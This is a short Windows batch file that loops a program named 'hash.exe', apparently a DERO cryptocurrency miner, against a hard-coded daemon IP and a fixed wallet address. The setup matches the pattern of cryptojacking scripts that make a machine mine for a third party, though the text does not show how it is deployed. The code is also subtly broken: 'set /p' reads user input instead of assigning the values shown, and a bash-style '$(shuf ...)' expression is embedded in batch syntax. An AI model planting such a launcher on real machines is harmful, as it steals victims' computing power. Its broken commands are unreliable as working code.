@echo off
set /p "daemon=45.86.230.214:80"
set /p "wallet=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-WIN)"
:loop
hash.exe -d %daemon% -w %wallet%
timeout 3
goto loop